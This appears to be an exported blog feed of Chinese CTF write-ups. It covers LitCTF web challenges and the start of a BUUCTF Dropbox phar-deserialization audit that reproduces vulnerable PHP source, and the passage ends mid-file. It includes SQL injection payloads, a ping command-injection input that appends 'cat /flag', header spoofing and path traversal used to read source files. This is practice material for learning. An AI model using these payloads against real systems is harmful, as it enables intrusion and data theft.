class="line">flag,news,users</span><br></pre></td></tr></table></figure><p>爆字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1)))))) union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;#</span><br><span class="line">flag</span><br></pre></td></tr></table></figure><p>爆数据：</p><p> <code>1)))))) union select 1,flag from ctftraining.flag#</code></p><p>最后一个稍微有点坑 是我不了解的知识点 之前联合注入都是比如 <code>select flag from flag</code> 没有限定数据库</p><p>导致当时做这道题目时候一直没注出来 麻了人</p><p>这里要限定一下数据库然后再加上表名 <code>ctftraining.flag</code> 又学到了</p><p>然后输入2 就是第四个彩蛋了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684035939663-eeb7c294-4ece-44ca-bc2a-4307cf2595c8.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F1rst_to_Th3_eggggggggg!&#125; (4/4)</span><br></pre></td></tr></table></figure><h2 id="Http-pro-max-plus"><a href="#Http-pro-max-plus" class="headerlink" title="Http pro max plus"></a>Http pro max plus</h2><p><code>User-Agent: Chrome</code> 这里要把其他的删光只留这个 当时问了一下出题人</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">client-ip: 127.0.0.1</span><br><span class="line">referer: pornhub.com</span><br></pre></td></tr></table></figure><p><code>Via: Clash.win</code>这是我学到的新知识     Via头部列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036183348-620dc01a-1469-4042-bc7c-178bc11d707b.png" alt="img"></p><p>之后获得一个新路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/wtfwtfwtfwtf.php</span><br></pre></td></tr></table></figure><p>查看源码<code>/sejishikong.php</code> 获得flag</p><h2 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h2><p>发现除了127.0.0.1以外其他都会被拦截 并且是前端拦截 直接js禁用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat /flag</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036599778-78cb6936-8433-497b-9f16-d17f2cf50026.png" alt="img"></p><h2 id="1zjs"><a href="#1zjs" class="headerlink" title="1zjs"></a>1zjs</h2><p>这道题 我愿称之为我是终极眼瞎</p><p>去翻了好多次源码 眼瞎没看到 甚至想过原型链污染  </p><p>最后一次去看源码 一眼丁真 就藏在最开始的地方 我真该死</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036747062-88a40a10-6869-43f6-9d6e-c87a50cb22a5.png" alt="img"></p><p>访问 <code>/f@k3f1ag.php</code>获得一串jsfuck码</p><p>在console中打入就能得到flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684036805391-53d257b5-636b-4015-8b98-88c2ce3351e4.png" alt="img"></p><h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>从上面题目各获取一部分 拼起来即可<code>NSSCTF&#123;First_t0_The_k3y!_S0_ne3t?_R3ady_Pl4yer_000ne_F1rst_to_Th3_eggggggggg!&#125;</code></p><h2 id="就当无事发生"><a href="#就当无事发生" class="headerlink" title="就当无事发生"></a>就当无事发生</h2><p>感觉这道题目不是一个web题目 纯纯的社工题目</p><p>找到github博客仓库 然后去看博客仓库分支的commit提交</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037606894-c0770701-9d8d-488a-8fa1-3c7a7561dc65.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037619054-3eb302ae-5d2c-4ef8-9799-c962b8176c72.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684037636268-0e531107-6615-480e-970b-9ec0d7e05150.png" alt="img"></p><h2 id="Flag点击就送！"><a href="#Flag点击就送！" class="headerlink" title="Flag点击就送！"></a>Flag点击就送！</h2><p>这题吧 不想说啥 一眼丁真就以为session伪造 但是没有给到具体的key的信息或者暗示 然后想过模板注入也都不是 甚至想到xss去获取admin session</p><p>最后发现 key 就是 <code>LitCTF</code>  。。</p><p>最后session伪造 访问<code>/flag</code>即可</p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask session伪造 </tag>
            
            <tag> js </tag>
            
            <tag> sql注入 </tag>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-76-[CISCN2019 华北赛区 Day1 Web1]Dropbox</title>
      <link href="/post/fb6927e0.html"/>
      <url>/post/fb6927e0.html</url>
      
        <content type="html"><![CDATA[<p>[CISCN2019 华北赛区 Day1 Web1]Dropbox</p><span id="more"></span><p>一道经典的phar 反序列化题目</p><p>注册一个账号然后登录</p><p>发现可以上传文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683716402325-7c52d9d0-9c71-4709-ba00-3c1b57bc054f.png" alt="img"></p><p>一开始以为是上传木马 当然不可能 buu第三页的题目不可能这么简单</p><p>然后下载我们上传上去的文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683716516171-45a1f1e3-ceb9-45b2-8b61-098e3e6ff05b.png" alt="image.png"></p><p>发现通过&#x2F;download 请求了<code>filename=</code>来实现下载</p><p>这里存在文件任意读漏洞</p><p>构造<code>paylaod:filename=../../文件</code>可以得到很多源码</p><p>共能下到7个php文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1683716726355-fa8d5653-be99-429d-9775-279dbf7347d9.png" alt="img"></p><p>接下来就是漫长的代码审计了</p><h2 id="审计："><a href="#审计：" class="headerlink" title="审计："></a>审计：</h2><p>首先 login.php与register.php都是很常规的初处理 不多说</p><p>然后是uplaod.php也是一些常规的检查上传文件合法与否的语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">uplaod.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>])) &#123;</span><br><span class="line">  <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">  <span class="variable">$pos</span> = <span class="title function_ invoke__">strrpos</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$pos</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>, <span class="number">0</span>, <span class="variable">$pos</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$fileext</span> = <span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">  <span class="keyword">switch</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;image/gif&#x27;</span>:</span><br><span class="line">    <span class="variable">$fileext</span> = <span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;image/jpeg&#x27;</span>:</span><br><span class="line">    <span class="variable">$fileext</span> = <span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;image/png&#x27;</span>:</span><br><span class="line">    <span class="variable">$fileext</span> = <span class="string">&quot;.png&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Only gif/jpg/png allowed&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$dst</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>] . <span class="variable">$filename</span> . <span class="variable">$fileext</span>;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dst</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invaild filename&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>download.php与delete.php一起看吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">download.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">delete.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不管是删除还是下载路由都有<code>$file = new File();</code></p><p>跟踪一下 到class.php 也是最重要的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> </span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title 